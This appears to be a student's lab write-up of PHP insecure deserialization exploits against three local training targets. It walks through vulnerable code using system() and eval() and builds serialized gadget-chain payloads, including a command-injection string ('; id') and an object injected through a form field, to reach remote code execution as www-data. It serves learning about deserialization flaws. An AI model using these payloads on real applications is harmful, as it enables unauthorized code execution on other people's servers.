*** PHP Unserialize 

[LEVEL 1] Target: http://localhost:25001

	- Look at /vendor you can see that this folder is set up for download some dependencies that are necessary for this project, so we dont need to care this folder
	
	- First, let take a look at index.php file 
	
	<?php
	// include all necessary libs in compose
	require('vendor/autoload.php');

	// include all php file in libs folder, this is the key for this project
	// Reference: https://stackoverflow.com/questions/599670/how-to-include-all-php-files-from-a-directory
	foreach (glob("libs/*.php") as $filename) {
    	include($filename);
	}

	session_start();
	
	// these lines is just about type name, age of a student and then push them in a array
	if (!isset($_SESSION["students"]))
    	$_SESSION["students"] = array();

	if (isset($_POST["name"]) && isset($_POST["age"])) {
    	$student = new Student($_POST["name"], $_POST["age"]);
    	array_push($_SESSION["students"], $student);
    	
	}

	include("save-load.php");
	?>
	
	- So now, we gonna see somethings special in router.php
	
	<?php
	class Router
	{
    		public $host;

    		public function __construct($host)
    		{
        		$this->host = $host;
    		}
		// __toString function is activated when a object is string
    		public function __toString()
    		{
        		return system("ping " . $this->host); // this is untrusted data, so we can control this one
    		}
	}
	
	
	- Let see in /templates/table.php, just print out the student on screen 
	...
	<?php 
            foreach ($_SESSION["students"] as $idx => $student)
                // Duyệt qua từng học sinh và in thông tin ra màn hình
                echo <<<EOF
                    <tr>
                        <th scope="row">{$idx}</th>{$student}
                    </tr>
                EOF;
        ?>
        ...
        
        - But take a look at save-load.php
        
        case 'load':
            $data = file_get_contents($_FILES["data"]["tmp_name"]);
            $students_data = explode("|", $data);
            $students = array();
            for ($idx = 0; $idx < count($students_data); $idx = $idx + 2) {
                $key = $students_data[$idx];
                $value = $students_data[$idx + 1];
                $students[$key] = $value;
                $_SESSION["students"] = $students;
            }
	
	- The space between these strings is | so, we need to add | in the begining and the end of trings
	
	=>> Now, run a php file with the following code:
	
	<?php
	class Router
	{
    		public $host;

    		public function __construct($host)
    		{
        		$this->host = $host;
    		}
    		public function __toString()
    		{
        		return system("ping " . $this->host); 
    		}
	}
	
	$first = new Router("; id");
	$result = serialize($first);
	echo $result;
	?>
	
	=>> In terminal, just run this file, we will get:
	khanh@kali:~/Desktop$ php test22.php
	O:6:"Router":1:{s:4:"host";s:4:"; id";}
	=>> Fix this by add |
	=>> 0|O:6:"Router":1:{s:4:"host";s:4:"; id";}|
	
	=>> FINAL RESULT:RCE uid=33(www-data) gid=33(www-data) groups=33(www-data)
	
	
	
[LEVEL 2] Target: http://localhost:25002

	- First, let take a look at index.php file, now we can not use router.php file, cause these lines
	...
	foreach (glob("libs/*.php") as $filename) {
    	// Không include file router.php
    	if ($filename !== "libs/router.php")
        include($filename);
	}
	...
	- Now, we will find a vunerable function, we can easy see in utils.php file
	
	...
	class Calculator
	{
    		public $expression;
    		public function __construct($expr)
    		{
        	$this->expression = $expr;
    		}

    		public function get_result()
    		{
        	$result = eval($this->expression);
        	return $result;
    		}
	}
	...
	
	=>> can you see eval function in this class, this function can run php code, so we can use system function to run payload right
	- now we need to find a class that also have get_result() function 
	- luckily, we can see in student.php file  in class student, we have get_point() function 
	
	<?php
	include_once("exam.php");
	class Student
	{

    	public $name;
    	public $age;
    	public $exam;
    	public function __construct($name, $age)
    	{
        	$this->name = $name;
        	$this->age = $age;
    	}
	...
	public function get_point()
    	{
        if (isset($this->exam))
            return $this->exam->get_result();
        return "N/A";
    	}
	}


	-- combine with, when we download file, we have 
	0|O:7:"Student":3:{s:4:"name";s:5:"Khanh";s:3:"age";s:2:"20";s:4:"exam";N;}|
        1|O:7:"Student":3:{s:4:"name";s:3:"nam";s:3:"age";s:3:"121";s:4:"exam";N;}|
        
        =>> you see that, exam class is not defined, N is mean null, so we need to fix the code to run get_point() function
        =>> make a php file like the previous level
        
<?php
class Calculator
{
    public $expression;
    public function __construct($expr)
    {
        $this->expression = $expr;
    }

    public function get_result()
    {
        $result = eval($this->expression);
        return $result;
    }
}

class Student
{

    public $name;
    public $age;
    public $exam;
    public function __construct($name, $age, $exam)
    {
        $this->name = $name;
        $this->age = $age;
        $this->exam = $exam;
    }

    public function __toString()
    {
        return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>";
    }

    public function join($exam)
    {
        $this->exam = $exam;
    }

    public function test()
    {
        $this->exam->test();
    }

    public function get_point()
    {
        if (isset($this->exam))
            return $this->exam->get_result();
        return "N/A";
    }
}

$first = new Calculator("system('id');");
$second = new Student("nam","17",$first);
$result = serialize($second);
echo $result;
?>
	
	=>> khanh@kali:~/Desktop$ php test.php
	O:7:"Student":3:{s:4:"name";s:3:"nam";s:3:"age";s:2:"17";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:13:"system('id');";}}
	
	FINAL RESULT: RCE uid=33(www-data) gid=33(www-data) groups=33(www-data)
	
	
[LEVEL 3] Target: http://localhost:25003

	- This lab is different from the two previous labs, cause there are no place to save and upload file, they just say it is saved and loaded
	- You can see in safe-save-load.php file
	...
	case 'save':
            // Lặp qua từng student và lưu xuống theo dạng KEY1|VALUE1|KEY2|VALUE2 ...
            $message = "";
            foreach ($_SESSION["students"] as $key => $student)
                $message = $message . $key . "|" . serialize($student) . "|";
            // Tải về thành file students.sav
            // Reference: https://stackoverflow.com/questions/13279801/how-can-i-download-a-string-to-the-browser-using-php-not-a-text-file
            file_put_contents("/usr/save_files/" . session_id(), $message);
            echo "Saved";
            echo '<meta http-equiv="refresh" content="1;url='. $_SERVER['PHP_SELF']. '">';
            die();
            break;
        case 'load':
            $data = file_get_contents("/usr/save_files/" . session_id());
            $students_data = explode("|", $data);
            $students = array();
            for ($idx = 0; $idx < count($students_data); $idx = $idx + 2) {
                $key = $students_data[$idx];
                $value = $students_data[$idx + 1];
         ...
         
         =>> This labs is save data from /usr/save_files/{session_id} and then get the data from there
         
         - we can see they save data normally
         root@67f6b10cfcb7:/usr/save_files# cat 2b8d4344bd68324565d758e0205dc8e7
	 0|O:7:"Student":3:{s:4:"name";s:5:"khanh";s:3:"age";s:2:"13";s:4:"exam";N;}|
	 
	 =>> try to use a html injection, like this 
	 name: anything you want
	 age: 13";s:4:"exam";N;}|1|O:7:"Student":3:{s:4:"name";s:3:"nam";s:3:"age";s:2:"17";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:13:"system('id');";}}
	
	 =>> we can use the previous payload from the last level 
	 =>> type this payload, then save and load the data you will see the result 
	 
	 
	FINAL RESULT: RCE uid=33(www-data) gid=33(www-data) groups=33(www-data)
	
	
	
	
	
	
	
	
	
	
	
	
